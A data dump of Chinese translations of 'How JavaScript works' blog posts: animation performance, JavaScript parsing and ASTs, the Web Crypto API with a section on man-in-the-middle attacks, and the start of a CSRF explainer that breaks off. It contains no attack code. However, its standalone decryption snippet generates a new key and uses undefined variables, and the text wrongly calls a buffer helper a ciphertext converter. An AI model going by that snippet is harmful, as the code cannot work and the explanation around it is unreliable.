来通知浏览器将会更改某个元素的属性。这会允许浏览器当更改某个元素属性的时候，事先进行恰当的优化。但不要滥用 will-change，因为这样做会适得其反，使得浏览器浪费更多的资源，从而造成更多的性能问题。 为 transforms 和 opacity 添加 will-change 代码如下： 123.box { will-change: transform, opacity;} 该属性在 Chrome, Firefox，Opera 得到很好的兼容。 如何选择 JavaScript 和 CSS 来执行动画这个问题没有标准答案。只需谨记以下原则： 基于 CSS 的动画和原生支持的网页动画一般都是由被称为『合成线程』的线程来处理的。这不同于浏览器的主线程，主线程是用来执行计算样式，布局，绘制及 JavaScript 代码的。这即意味着如果浏览器在主线程上运行耗时的任务，不会中断动画的运行。 很多时候，也可以由合成线程来处理 transforms 和 opacity 属性值的更改。 如果任何动画触发绘制，布局或者同时触发两者，『主线程』将不得不来进行处理。事实是基于 CSS 和 JavaScript 的动画和布局或者绘制的性能开销将很有可能会阻塞所有和 CSS 或者 JavaScript 运行相关的工作，从而使渲染问题产生争议。 正确使用动画良好的动画为项目添加一层令人愉快和互动的用户体验。你可以随意使用动画，不管是宽度，调试，定位，颜色或背景色，但必须注意潜在的性能瓶颈。糟糕的动画选择会影响用户体验，所以动画必须是高效和适当的。尽可能减少使用动画。只使用动画来让用户体验流畅自然而不是滥用。 使用动画支持交互不要为了用而去用动画。相反，有策略性地使用动画来加强用户交互体验。避免使用不必要的动画来打断或者阻碍用户的使用。 避免为性能开销大的属性做动画比糟糕的动画使用更糟的是那些会引起页面卡顿的动画。这类动画会让用户感到懊恼和不快。 引用资源 https://developers.google.com/web/fundamentals/design-and-ux/animations/css-vs-javascript https://developers.google.com/web/fundamentals/design-and-ux/animations/ https://developers.google.com/web/fundamentals/design-and-ux/animations/animations-and-performance","link":"/posts/3eb63396.html"},{"title":"解析，抽象语法树及最小化解析时间的5个技巧","text":"How JavaScript works: Parsing, Abstract Syntax Trees (ASTs) + 5 tips on how to minimize parse time 原文请查阅这里。 概述我们都知道运行一堆 JavaScript 代码性能会变得很糟糕。代码不仅需要在网络中传输而且还要解析，编译为字节码，最后运行。之前的文章讨论了诸如 JS 引擎，运行时及调用栈，还有为 Google Chrome 和 NodeJS 广泛使用的 V8 引擎的话题。它们都在整个 JavaScript 的运行过程中扮演着重要的角色。 今天的主题也非常重要：了解大多数的 JavaScript 引擎是如何把文本解析为机器能够理解的代码，转换之后发生的事情以及开发者如何利用这一知识。 编程语言工作原理首先我们回顾一下编程语言原理。无论使用何种编程语言，你经常需要一些软件来处理源码以便让计算机能够理解。该软件可以是解释器或编译器。不管是使用解释型语言(JavaScript, Python, Ruby) 或者编译型语言(C#, Java, Rust)，它们都有一个共同点：把源码作为纯文本解析为语法抽象树(AST)的数据结构。AST 不仅要以结构化地方式展示源码，而且在语义分析中扮演了重要的角色，编译器检查验证程序和语言元素的语法使用是否正确。之后，使用 AST 来生成实际的字节码或者机器码。 AST 程序AST 不止应用于语言解释器和编译器，在计算机世界中，还有其它应用。最为常见的用途之一即静态代码分析。静态代码分析并不会运行输入的代码。但是，它们仍然需要理解代码的结构。比如，实现一个工具来找出常见的代码结构以便用来代码重构减少重复代码。或许你可以使用字符串比较来实现，但是工具会相当简单且有局限性。如果你有兴趣实现这样的工具，你不必自己动手去编写解析器，有许多完美兼容于 Ecmascript 规范的开源项目。Esprima 和 Acorn 即是黄金搭档。还有其它工具可以用来帮助解析器输出代码，即 ASTs. ASTs 被广泛应用于代码转换。比如你可能想实现一个转换器用来转换 Python 代码为 JavaScript.大致的思路即使用 Python 代码转换器来生成 AST，然后使用该 AST 来生成 JavaScript 代码。你可能会觉得难以置信。事实是 ASTs 只是部分语言的不同表示法。在解析之前，它表现为文本，该文本遵守着构成语言的一些语法规则。解析之后，它表现为一种树状结构，该结构所包含的信息和输入文本几乎一样。因此，也可以进行反向解析然后回到文本。 JavaScript 解析让我们看一下 AST 的构造。以如下一个简单 JavaScript 函数为例子： 12345678function foo(x) { if (x &gt; 10) { var a = 2; return a * x; } return x + 10;} 解析器会产生如下的 AST。 请注意，这里为了展示用只是解析器输出的简化版本。实际的 AST 要更加复杂。这里用来了解一下运行源码之前的第一个步骤。可以访问 AST Explorer 来查看实际的 AST 树。这是一个在线工具，你可以在上面写 JavaScript 代码，然后网站会输出目标代码的 AST。 也许你会问为什么我得学习 JavaScript 解析器的工作原理。反正，浏览器会负责运行 JavaScript 代码。这说法也不能说是错的。以下图表展示了 JavaScript 运行过程中不同阶段的耗时。也许你可以发现点有趣的东西。 通常情况下，浏览器大概消耗了 15% 到 20% 的总运行时间来解析 JavaScript。我没有具体统计过这些数值。这些统计数据来自于现实世界中程序和网站。现在也许 15% 看起来不是很多，但相信我，很多的。一个普通单页面程序会加载大约 0.4M 的 JavaScript 代码，然后消耗掉浏览器大概 370ms 的时间来进行解析。也许你又会说，这也不是很多嘛。本身花费的时间并不多。但记住了，这只是把 JavaScript 代码转化为 ASTs 所消耗的时间。其中不包含运行本身的时间或者页面加载期间其它诸如 CSS 和 HTML 渲染的过程的耗时。这只是桌面浏览器所面临的问题。移动浏览器的情况会更加复杂。一般情况下，手机移动浏览器解析代码的时间是桌面浏览器的 2-5 倍。 以上图展示了不同移动和桌面浏览器解析 1MB JavaScript 代码所消耗的时间。 另外，为了获得更多类原生的用户体验而把越来越多的业务逻辑堆积在前端，网页程序变得越来越复杂,臃肿。你可以轻易地想到网络应用受到的性能影响。只需打开浏览器开发者工具，然后使用该工具来检测解析，编译及其它发生于浏览器中直到页面完全加载所消耗的时间。 不幸的是，移动浏览器没有开发者工具来进行性能检测。不用担心。因为有 DeviceTiming 工具。它可以用来帮助检测受控环境中脚本的解析和运行时间。它通过插入代码来封装本地代码，这样每当从不同设备访问的时候，可以本地测量解析和运行时间。 好的一面是 JavaScript 引擎做了大量的工作来避免冗余工作及更加高效。以下为主流浏览器使用的技术。 例如，V8 实现了 script 流和代码缓存技术。Script 流即当脚本开始下载的时候，async 和 deferred 的脚本在单独的线程中进行解析。这意味着解析会在脚本下载完成时立即完成。这会提升 10% 的页面加载速度。 每当访问页面的时候，JavaScript 代码通常会被编译为字节码。但是，当用户访问另一个页面的时候，该字节码会作废。这是因为编译的代码严重依赖于编译阶段机器的状态和上下文。从 Chrome 42 开始带来了字节码缓存。该技术会本地缓存编译过的代码，这样当用户返回到同一页面的时候，下载，解析和编译等步骤都会被跳过。这样就会为 Chrome 节约大概 40% 的代码解析和编译时间。另外，这同样会节省手机电量。 Opera 中，Carakan 引擎可以复用另一个程序最近编译过的输出。不要求代码在同一页面或是相同域名下。该缓存技术非常高效且可以完全跳过编译步骤。它依赖于典型的用户行为和浏览场景：每当用户在程序/网站上遵循特定的用户浏览习惯，则会加载相同的 JavaScript 代码。然而，Carakan 早就被谷歌 V8 引擎所取代。 Firefox 使用的 SpiderMonkey 引擎没有使用任何的缓存技术。它可以过渡到监视阶段，在那里记录脚本运行次数。基于此计算，它推导出频繁使用而可以被优化的代码部分。 很明显地，一些技术则选择不做任何处理。Safari 首席开发者 Maciej Stachowiak 指出 Safari 不缓存编译的字节码。他们可能已经想到了缓存技术但并没付诸实施，因为生成代码的耗时小于总运行时间的 2%。 这些优化措施没有直接影响 JavaScript 源码的解析时间，但是会尽可能完全避免。毕竟聊胜于无。 有许多方法可以用来减少程序的初始化加载时间。最小化加载的 JavaScript 数量：代码越少，解析耗时越少，运行时间越少。为了达到此目的，可以用特殊的方法传输必需的代码而不是一股劳地加载一大坨代码。比如，PRPL 模式即表示该种代码传输类型。或者，可以检查依赖然后查看是否有无用、冗余的依赖导致代码库的膨胀。然而，这些东西需要很大的篇幅来进行讨论。 本文的目标即Web开发者如何帮助加快 JavaScript 解析器的解析速度。现代 JavaScript 解析器使用 heuristics(启发法) 来决定是否立即运行指定的代码片段或者推迟在未来的某个时候运行。基于这些 heuristics，解析器会进行立即或者懒解析。立即解析会运行需要立即编译的函数。其主要做三件事：构建 AST，构建作用域层级，然后检查所有的语法错误。而懒解析只运行未编译的函数，它不构建 AST和检查任何语法错误。只构建作用域层级，这样相对于立即解析会节省大约一半时间。 显然，这并不是一个新概念。甚至像 IE9 这样老掉牙的浏览器也支持该优化技术，虽然和现代解析器的工作方式相比是以一种简陋的方式实现的。 假设有如下代码片段： 1234567891011function foo() { function bar(x) { return x + 10; } function baz(x, y) { return x + y; } console.log(baz(100, 200));} 和之前代码类似，把代码输入解析器进行语法分析然后输出 AST。这样表述如下： 声明 bar 函数接收 x 参数。有一个返回语句。函数返回 x 和 10 相加的结果。 声明 baz 函数接收两个参数(x 和 y)。有一个返回语句。函数函数 x 和 y 相加结果。 调用 baz 函数传入 100 和 2。 调用 console.log 参数为之前函数调用的返回值。 那么期间发生了什么呢？解析器发现了 bar 函数声明， baz 函数声明，调用 bar 函数及调用 console.log 函数。然而，解析器做了完全不相关的额外无用功即解析 bar 函数。为何不相关？因为函数 bar 从未被调用(或者至少不是在对应时间点上)。这只是一个简单示例及可能有些不同寻常，但是在现实生活的许多程序中，许多函数声明从未被调用过。 这里不解析 bar 函数，该函数声明了却未指出其用途。只在需要的时候在函数运行前进行真正的解析。懒解析仍然只需要找出整个函数体然后为其声明。它不需要语法树因其将不会被处理。另外，它不从内存堆中分配内存，而这会消耗相当一部分系统资源。简而言之，跳过这些步骤可以有巨大的性能提升。 所以之前的例子，解析器实际上会像如下这样解析： 注意到这里仅仅只是确认函数 bar 声明。没有进入 bar 函数体。这种情况下，函数体只有一句简单的返回语句。然而，正如现代世界中的大多数程序那样，函数体可能会更加庞大，包含多个返回语句，条件语句，循环，变量声明甚至嵌套函数声明。由于函数从未被调用，这完全是在浪费时间和系统资源。 实际上这是一个相当简单的概念，然而其实现是非常难的。不局限于以上示例。整个方法还可以应用于函数，循环，条件语句，对象等等。一般情况下，所有代码都需要解析。 例如，以下是一个实现 JavaScript 模块的相当常见的模式。 1234var myModule = (function() { // 整个模块的逻辑 // 返回模块对象})(); 该模式可以被大多数现代 JavaScript 解析器识别且标识里面的代码需要立即解析。 那么为何解析器不都使用懒解析呢？如果懒解析一些代码，而该代码必须立即运行，这样就会降低代码运行速度。需要运行一次懒解析之后进行另一个立即解析。和立即解析相比，运行速度会降低 50%。 现在，对解析器底层原理有了大致的理解，是时候考虑如何帮助提高解析器的解析速度了。可以以这样的方式编写代码，这样就可以在正确的时间解析函数。这里有一个为大多数解析器所识别的模式：使用括号封装函数。这样会告诉解析器需要立即函数。如果解析器看到一个左括号且之后为函数声明，它会立即解析该函数。可以通过显式声明立即运行函数来帮助解析器加快解析速度。 假设有一个 foo 函数 123function foo(x) { return x * 10;} 因为没有明显地标识表明需要立即运行该函数所以浏览器会进行懒解析。然而，我们确定这是不对的，那么可以运行两个步骤。 首先，把函数存储为一变量。 123var foo = function foo(x) { return x * 10;}; 注意，在 function 关键字和函数参数的左括号之间的函数名。这并不是必要的，但推荐这样做，因为当抛出异常错误的时候，堆栈追踪会包含实际的函数名而不是 &lt;anonymous&gt;。 解析器仍然会做懒解析。可以做一个微小的改动来解决这一问题：用括号封装函数。 123var foo = (function foo(x) { return x * 10;}); 现在，解析器看见 function 关键字前的左括号便会立即进行解析。 因需要知道解析器在何种情况下懒解析或者立即解析代码，所以可操作性会很差。同样地，开发者需要花时间考虑指定的函数是否需要立即解析。肯定没人想费力地这么做。最后，这肯定会让代码难以阅读和理解。可以使用 Optimize.js 来处理此类情况。该工具只是用来优化 JavaScript 源代码的初始加载时间。他们对代码运行静态分析，然后通过使用括号封装需要立即运行的函数以便浏览器立即解析并准备运行它们。 看一小段代码如下： 123(function() { console.log('Hello, World!');})(); 一切看起来很美好，因为在函数声明前添加了左括号。当然，在进入生产环境之前需要进行代码压缩。以下为压缩工具的输出： 1!function(){console.log('Hello, World!')}(); 看起来一切正常。代码如期运行。然而好像少了什么。压缩工具移除了封装函数的括号代之以一个感叹号。这意味着解析器会跳过该代码且将会运行懒解析。总之，为了运行该函数解析器会在懒解析之后进行立即解析。这会导致代码运行变慢。幸运的是，可以利用 Optimize.js 来解决此类问题。传给 Optimize.js 压缩过的代码会输出如下代码： 1!(function(){console.log('Hello, World!')})(); 现在，充分利用了各自的优势：压缩代码且解析器正确地识别懒解析和立即解析的函数。 预编译但是为何不在服务端进行这些工作呢？总之，比强制各个客户端重复做该项事情更好的做法是只运行一次并在客户端输出结果。那么，有一个正在进行的讨论即引擎是否需要提供一个运行预编译代码的功能以节省浏览器的运行时间。本质上，该思路即使用服务端工具来生成字节码，这样就只需要传输字节码并在客户端运行。之后，将会看到启动时间上的一些主要差异。这听起来很有诱惑性但实现起来会很难。可能会有反效果，因为它将会很庞大且由于安全原因很有可能需要进行签名和处理。例如，V8 团队已经在内部解决重复解析问题，这样预编译有可能实际上没啥作用。 一些提升网络应用速度的建议 检查依赖。减少不必要的依赖。 分割代码为更小的块而不是一大块。如 webpack 的 code-spliting 功能。 尽可能延迟加载 JavaScript 代码。可以只加载当前路由所要求的代码片段。比如只在点击某个元素的时候引入 某段代码模块。 使用开发者工具和 DeviceTiming 来检测性能瓶颈。 使用像 Optimize.js 的工具来帮助解析器选择立即解析或者懒解析以加快解析速度。 资源参考 https://en.wikipedia.org/wiki/Abstract_syntax_tree https://medium.com/@jotadeveloper/abstract-syntax-trees-on-javascript-534e33361fc7 https://medium.com/reloading/javascript-start-up-performance-69200f43b201 https://timkadlec.com/2014/09/js-parse-and-execution-time/ https://www.youtube.com/watch?v=Fg7niTmNNLg","link":"/posts/9d8c3abf.html"},{"title":"密码学及中间人攻击处理","text":"https://blog.sessionstack.com/how-javascript-works-cryptography-how-to-deal-with-man-in-the-middle-mitm-attacks-bf8fc6be546c 原文请查阅这里。 网络安全是 IT 行业的重要领域之一。每天都有许多人通过互联网与世界各地进行交流。当人们通过互联网进行通信时，信息在到达目的地之前可能会被窃听甚至劫持信息。同样，黑客也有可能利用计算机网络漏洞的窃取用户的个人数据。 那么人们如何才能安全地通过互联网发送信息，JavaScript 又将扮演什么角色？这篇文章将带你一同寻答案。 在本章中，您将了解密码学及其是如何在 JavaScript 中工作以及处理中间人攻击（MitM）。 什么是加密密码学主要关注保护信息和通信安全的过程，确保只有发送者和预定的接收方才能访问。密码学构造了各种技术用于正确地保护通信。这些技术包括使用密钥进行加密解密，使用各种算法对通信过程进行哈希处理，或签名生成和验证。 由于许多人使用 JavaScript 构建的移动应用程序在互联网上进行交流，因此有必要了解加密在 JavaScript 中的工作方式。在下一节中，我们将研究 JavaScript 的 Web 加密 API 及其如何支持加密。 JavaScript Web 加密 API确保通过互联网进行安全通信非常重要，因此部分浏览器已实现了 crypto接口。但此接口定义不那么明确且听起来和密码学不那么相关。 JavaScript 的网络加密API 提供了一个定义明确的接口，称为 SubtleCrypto。 加密 API 允许开发人员将基本的加密功能集成到他们的应用中而不需第三方库。您可以进行文档签名，身份验证或对通信进行完整性检查。 例如，开发者可以通过运行以下代码来获取 8 位无符号整数数组的加密安全随机数据： 12const secure = window.crypto.getRandomValues(new Uint8Array(10));console.log(secure); 如果在 Chrome 的控制台上运行此代码，则会得到 10 个 8 位随机生成且未签名的数字的输出。 让我们看一下 JavaScript 的网络加密 API 的工作原理，以及如何从网络控制台中实现。 有了网络加密 API，由于其具有加密安全性，服务器就无法看到数据。仅发送者和接收者有权访问通信数据。 在上图例中，您可以看到 API​​ 对发送方的数据进行了加密。接收者使用密钥解密数据，服务器和数据库无法解密加密数据。您可以执行基本的加密操作，例如散列，签名生成和验证，加密和解密，这些将在本文中进一步讨论。 基本加密函数开发者可以使用 JavaScript 网络加密 API 执行多种加密功能。在本节中，我们将研究基本的加密函数，例如散列，签名生成和验证，加密和解密。 加密加密是基本的密码学功能之一。在加密中，使用密钥将人类语言（纯文本）的消息转换为计算机语言（密文）。为了使接收者理解发送者的消息，他们必须使用密钥。 加密过程使用 crypto 方法。语法如下： 12//Syntax for encrypt functionconst result = crypto.subtle.encrypt(algorithm, key, data); crypto 方法将返回一个包含 ArrayBuffer(密文载体) 的 Promise。如果在加密过程中发生错误，最好返回一个拒绝的新 Promise，以规范化算法。为了更好地理解这一点，我们将使用 AES-GCM 密钥和算法对纯文本进行加密。在浏览器中复制以下代码，注意输出的是密文。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/*The function strToArrayBuffer converts string to fixed-length raw binary data buffer because encrypt method must return a Promise that fulfills with an ArrayBuffer containing the \"ciphertext\"*/function strToArrayBuffer(str) { var buf = new ArrayBuffer(str.length * 2); var bufView = new Uint16Array(buf); for (var i = 0, strLen = str.length; i &lt; strLen; i++) { bufView[i] = str.charCodeAt(i); } return buf;}//The function arrayBufferToString converts fixed-length raw binary data buffer to 16-bit unsigned String as our plaintextfunction arrayBufferToString(buf) { return String.fromCharCode.apply(null, new Uint16Array(buf));}//This object below will generate our algorithm keyvar algoKeyGen = { name: \"AES-GCM\", length: 256,};//This will generate random values of 8-bit unsigned integervar iv = window.crypto.getRandomValues(new Uint8Array(12));//This object will generate our encryption algorithmvar algoEncrypt = { name: \"AES-GCM\", iv: iv, tagLength: 128,};//states that key usage is for encryptionvar keyUsages = [\"encrypt\"];var plainText = \"This is a secure message from Mary\";var secretKey;//This generates our secret Key with key generation algorithmwindow.crypto.subtle .generateKey(algoKeyGen, false, keyUsages) .then(function (key) { secretKey = key; //Encrypt plaintext with key and algorithm converting the plaintext to ArrayBuffer return window.crypto.subtle.encrypt( algoEncrypt, key, strToArrayBuffer(plainText) ); }) .then(function (cipherText) { //print out Ciphertext in console console.log(\"Cipher Text: \" + arrayBufferToString(cipherText)); }) .catch(function (err) { console.log(\"Error: \" + err.message); }); 观察一下代码，定义算法时也定义了 key 值。 1var algoKeyGen = { name: 'AES-GCM', length: 256}; 1var algoEncrypt = { name: 'AES-GCM', iv: iv, tagLength: 128}; strToArrayBuffer 函数将纯文本转换为密文，因为要实现的 Promise 必须是带有密文的 ArrayBuffer。 解密解密是加密的逆过程。解密中密文被转换回纯文本。为此，需要来自授权用户的密钥（密码）。这就像尝试使用钥匙来访问锁定的建筑物。您不会因为拥有一些钥匙而被带入建筑物。唯一允许您进入的方法是匹配的钥匙（可以打开建筑物）。 JavaScript 的网络加密API中的解密过程使用 decrypt 方法。以下是解密语法。 12//syntax for decrypting ciphertextconst result = crypto.subtle.decrypt(algorithm, key, data); 解密上述密文例子的代码如下： 123456789101112131415161718192021222324//This states that the keyusage for decryptingvar keyUsages = [\"decrypt\"];//This object below is for algorithm key generationvar algoKeyGen = { name: \"AES-GCM\", length: 256,};var plainText = \"This is a secure message from Mary\";var secretKey;//This will generate secrete key with algorithm key and keyusagewindow.crypto.subtle .generateKey(algoKeyGen, false, keyUsages) .then(function (key) { secretKey = key; //This will decrypt Cipheretext to plaintext return window.crypto.subtle.decrypt(algoEncrypt, secretKey, cipherText); }) // Print plaintext in console. .then(function (plainText) { console.log(\"Plain Text: \" + arrayBufferToString(plainText)); }) .catch(function (err) { console.log(\"Error: \" + err.message); }); 下面是加密和解密示例文本的完整代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// This code below will encrypt and decrypt plaintext/*The function strToArrayBuffer converts string to fixed-length raw binary data buffer because encrypt method must return a Promise that fulfills with an ArrayBuffer containing the \"ciphertext\"*/function strToArrayBuffer(str) { var buf = new ArrayBuffer(str.length * 2); var bufView = new Uint16Array(buf); for (var i = 0, strLen = str.length; i &lt; strLen; i++) { bufView[i] = str.charCodeAt(i); } return buf;}//The function arrayBufferToString converts fixed-length raw binary data buffer to 16-bit unsigned String as our plaintextfunction arrayBufferToString(buf) { return String.fromCharCode.apply(null, new Uint16Array(buf));}//This object below will generate our algorithm keyvar algoKeyGen = { name: \"AES-GCM\", length: 256,};//This will generate random values of 8-bit unsigned integervar iv = window.crypto.getRandomValues(new Uint8Array(12));//This object will generate our encryption algorithmvar algoEncrypt = { name: \"AES-GCM\", iv: iv, tagLength: 128,};//states that key usage is for encrypting and decryptingvar keyUsages = [\"encrypt\", \"decrypt\"];var plainText = \"This is a secure message from Mary\";var secretKey;//This generates our secret Key with key generation algorithmwindow.crypto.subtle .generateKey(algoKeyGen, false, keyUsages) .then(function (key) { secretKey = key; //Encrypt plaintext with key and algorithm converting the plaintext to ArrayBuffer return window.crypto.subtle.encrypt( algoEncrypt, key, strToArrayBuffer(plainText) ); }) .then(function (cipherText) { //This prints out the ciphertext, converting it from ArrayBuffer to 16-bit unsigned String console.log(\"Cipher Text: \" + arrayBufferToString(cipherText)); //This will decrypt ciphertext with secret key and algorithm return window.crypto.subtle.decrypt(algoEncrypt, secretKey, cipherText); }) //This prints out the plaintext, converting it from ArrayBuffer to 16-bit unsigned String .then(function (plainText) { console.log(\"Plain Text: \" + arrayBufferToString(plainText)); }) .catch(function (err) { console.log(\"Error: \" + err.message); }); 运行这段代码，将输出以前加密的纯文本。 下面的代码生成一个解密用的密钥。 123var secretKey;window.crypto.subtle.generateKey(algoKeyGen, false, keyUsages) .then(function (key) { secretKey = key; 加密过程大致分为对称加密和非对称加密。这种划分取决于用于解密的密钥类型。对于对称加密，加密和解密使用相同的密钥。而对于非对称加密，则使用不同的密钥对进行加密和解密。由授权用户共享的公共密钥用于加密，而来自接收者的秘密密钥用于解密。密钥由其所有者保密。 散列散列是一种加密方法，它允许您将任意大小的数据映射到固定大小的数组。加密哈希函数将数据从纯文本转换为唯一的数字字母字符串。散列与加密不同，它是一种单向功能。这意味着很难且几乎不可能从散列值中获取原始文本。 散列利用数学算法将纯文本转换为散列值。不像加密一样有能解密散列值的密钥。加密哈希函数主要用于身份验证。例如，在注册/登录中。用户注册时，密码会先进行哈希处理，然后再存储在数据库中。每当用户尝试登录时，都会对他们的密码进行哈希处理并将其与数据库中的哈希值进行比较确保密码匹配。使用这种方法，如果攻击者劫持了软件公司的数据库，则用户的登录信息对他们来说是无用的，因为他们无法解码或理解密码。 加密 API 提供了 crypto.subtle.digest 函数用于哈希加密。可以使用以下语法使用 SHA-1 ，SHA-384 或 SHA-512 算法对纯文本进行哈希处理。 12// Syntax for hashing plaintextconst digest = crypto.subtle.digest(algorithm, data); 要了解如何使用 crypto.subtle.digest 函数对消息进行哈希处理，请看下面的示例： 123456789101112const text = \"This is a secure message from Mary\";async function digestMessage(message) { const encode = new TextEncoder().encode(message); // encode as (utf-8) Uint8Array const hashBuffer = await crypto.subtle.digest(\"SHA-256\", encode); // hash the message const hashArray = Array.from(new Uint8Array(hashBuffer)); // convert buffer to byte array const hashHex = hashArray .map((b) =&gt; b.toString(16).padStart(2, \"0\")) .join(\"\"); // convert bytes to hex string return hashHex;}const digestHex = await digestMessage(text);console.log(digestHex); 在上面的示例程序我们使用 SHA-256 算法对文本 This is a secure message from Mary 进行哈希处理，并将字节转换为十六进制字符串。SHA-1 算法现在容易被破解，不建议在生产模式下使用。 签名生成及认证这是 JavaScript 的 Web 加密 API 的另一种加密方法。使用 sign 和 verify 方法，开发者可以使用密钥对文档进行签名。接收者可以使用他们的密钥来验证消息。 假设一个这样的场景，你想发送文档给朋友。为了确保文件的真实性，你需要对其进行签名。收到邮件的朋友会在看到签名就知道是你发的。 使用 sign 和 verify 方法来对文件进行签名及验证的语法如下： 1234//syntax to sign documentconst signature = crypto.subtle.sign(algorithm, key, data);//syntax to generate documentconst result = crypto.subtle.verify(algorithm, key, signature, data); 加密算法计算机没有自己的想法。因此，每当我们希望计算机执行某些任务时，我们都会让他们知道如何执行。例如，如果您希望计算机执行基础计算，则必须告知计算机要添加哪些数字以及如何进行计算。 算法是用于解决问题的一系列定义明确的计算机可执行指令。在加密中，您需要指定希望计算机执行加密的方式。 SHA 算法有多种形式，每种形式都指定哈希值的位长。在本节中，我们将研究 Web 加密 API 支持的基本加密方法。 ECDH (Elliptic Curve Diffie-Hellman)ECDH 全称是椭圆曲线迪菲-赫尔曼秘钥交换（Elliptic Curve Diffie–Hellman key Exchange）。该加密算法用于密钥生成和密钥协议。ECDH 密钥协议允许各自拥有公私钥对的两方建立安全通信。 ECDH 允许开发者执行以下操作： 密钥生成 位推导（Bits Derivation） 密钥导入 密钥导出 SHA (Secure Hash Algorithm)安全散列算法。该算法主要用于执行哈希函数。它将可变数据压缩为固定大小的位字符串输出。Web 加密 API 允许开发者使用SHA-1和 SHA-2 执行哈希函数，并支持 SHA-256，SHA-384，SHA-512 。开发者必须使用crypto.subtle.digest 函数才能使用此算法。 HMAC (Hash-based Message Authentication Code)密钥散列消息认证码。 使用哈希函数对值进行哈希处理后，您需要验证传入消息是否等于哈希值。请注意我们几乎无法将哈希值转换回其原始文本。为了比较值，使用 HMAC 算法对文档进行签名和验证，以确定真实性。使用此算法可以执行以下操作： 签名 校验 密钥生成 密钥导入 密钥导出 获取密钥长度 HKDF (Hash-based Key Derivation Function)是基于 HMAC 的密钥推导函数。它使用先提取然后扩展的方法。开发者可以使用此算法将共享密钥转换为更适合加密的稳定密钥，完整性检查或身份验证。使用此算法可以执行以下操作： 位推导 密钥导入 获取密钥长度 PBKDF2 (Password-Based Key Derivation Function 2)基于密码的密钥推导函数。PBKDF2 算法使用 PKCS＃5 标准 PBKDF2 来推导密钥。和 HKDF 算法类似，可以执行以下操作： 位推导 密钥导入 获取密钥长度 ECDSA (Elliptic Curve Digital Signature Algorithm)椭圆曲线数字签名算法基于椭圆曲线加密，允许使用开发者对文件进行签名及校验。它提供了电子签名算法 DSA的一种变式。 使用此算法可以执行以下操作： 签名 校验 密钥生成 密钥导入 密钥导出 RSA (Rivest–Shamir–Adleman) AlgorithmRSA 加密算法，用于保护互联网的信息。它是一种非对称密码算法。两个密钥用于加密和解密过程。公钥在授权用户之间共享，而私钥必须保持私有。 RSA 是由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）三人姓氏首字母组合成。 Rivest–Shamir–Adleman 支持其他可与 RSA 算法一起使用的填充算法。 Web 加密 API 支持以下 RSA 算法和填充方案。 RSASSA-PKCS1-v1_5 RSA-PSS RSA-OAEP AES (Advanced Encryption Standard) Algorithm高级加密标准算法有一个更为认知的名字 Rijndael 加密法，用于电子数据的加密，由美国国家标准技术研究院（NIST）于2001年建立。Web 加密 API 支持以下使用高级加密标准块的不同加密模型： AES-CTR AES-CBC AES-GCM AES-KW Web 加密 API 使用案例本节中我们将了解使用 Web 加密 API 的一些实时加密应用。 多重要素验证有时，黑客可以窃取用户密码。因此，即使这些密码在数据库中经过哈希处理或加密，也无法阻止它们访问帐户。为了确保正在访问帐户是本人，应用程序允许进行多重要素验证。 无需使用 TLS 客户端证书之类的传输层身份验证，程序可以使用合适的客户端密钥，该客户端密钥先前可能已通过用户代理生成，例如多因素令牌。 保护性文件交换加密的目标之一是在第三方在场的情况下确保互联网通信安全。由于监视他人对话第三方的存在，Web 加密 API 允许对文档进行签名，验证和加密。受保护的文档要求授权用户持有可以使他们访问文档的密钥。 云存储文档上传到远程服务器之前，可以通过 Web 加密 API进行保护。该应用程序可以让用户选择一个私钥，导出一个加密密钥，对文档进行加密，然后使用现有 APIS 将加密的数据上传到服务提供商。 安全通信用户可以使用 off-the-record（OTR）消息传递等方案进行安全的互联网通信。通信双方可以使用消息身份验证代码（MAC）密钥对消息进行加密和解密，以防止篡改。 JavaScript Object Signing and Encryption (JOSE)开发者可以使用 JavaScript 的 Web 加密 API 与由 JavaScript对象签名和加密（JOSE）工作组定义的结构和消息格式进行交互。 如何处理中间人攻击中间人攻击（MitM）也可以称为中间机器攻击。这种网络攻击种攻击者窃听两方之间的通信，以劫持或修改通信。 例如，一个中间人可能在从一方发送信息至另一方之前进行了拦截。让我们看一个双方通讯的例子：Nancy 和 Joy 的正在进行加密对话。 如果中间人 James 掌握了 Nancy 的密钥，则可以解密该消息，查看或修改其内容，然后再发送给 Joy。 以下是几种处理中间人攻击的方法。 使用篡改检测检测发生中间人攻击的方法。例如，各方可以检查响应时间是否有差异。 使用相互认证可以减少中间人攻击。因为服务器和客户端会验证彼此的通信。 取证分析是处理中间人攻击的另一种方法，因为它可以确定是否存在攻击并确定攻击来源。","link":"/posts/b7dcf6e2.html"},{"title":"跨站请求伪造攻击及7种缓解策略","text":"How JavaScript works: CSRF attacks + 7 mitigation strategies 原文请查阅[这里](How JavaScript works: CSRF attacks + 7 mitigation strategies)，本文采用知识共享署名 4.0 国际许可协议共享。 概述跨站请求伪造（CSRF：Cross-site request forgery, 发音为“sea-surf”），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是 Web 应用程序或网页的一种恶意攻击方法。在这类型的攻击中，攻击者伪装成受害者执行恶意请求。 恶意 Web 程序可以通过多种方式发起请求，例如特制图像标签，隐藏表单，AJAX 请求等。它们可以在用户不参与甚至不知情的情况下运行。 与跨站脚本（XSS）相比，XSS 利用的是用户对特定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 探索跨站请求伪造攻击CSRF 攻击工作时，受害​​者会提交他们不知情的恶意请求。可能会导致在 Web 应用程序执行一些操作，包括客户端或服务器数据泄漏，会话状态的更改和操纵终端用户帐户等。 CSRF 攻击是针对浏览器的责任混淆攻击的一个例子，因为低权限的攻击者欺骗了浏览器从而提交伪造的请求。 CSRF 通常具有以下特征： 涉及依赖用户认证体系的网站或 Web 应用。 利用网站对该认证的信任。 欺骗用户浏览器向目标站点发送 HTTP 请求。 涉及存在副作用的 HTTP 请求。 跨站请求伪造攻击步骤如下： 受害者执行由攻击者控制的动作，例如访问网页，点击链接等。 此操作伪装成受害者的身份发送 HTTP 请求到 Web 应用。 如果受害者在 Web 应用上具有通过身份验证的活动会话，则该请求将作为合法请求进行处理。 重要的是，受害者与网络应用间必须保持有效会话，而该会话就是 CSRF 攻击的目标。 大多数情况下，CSRF 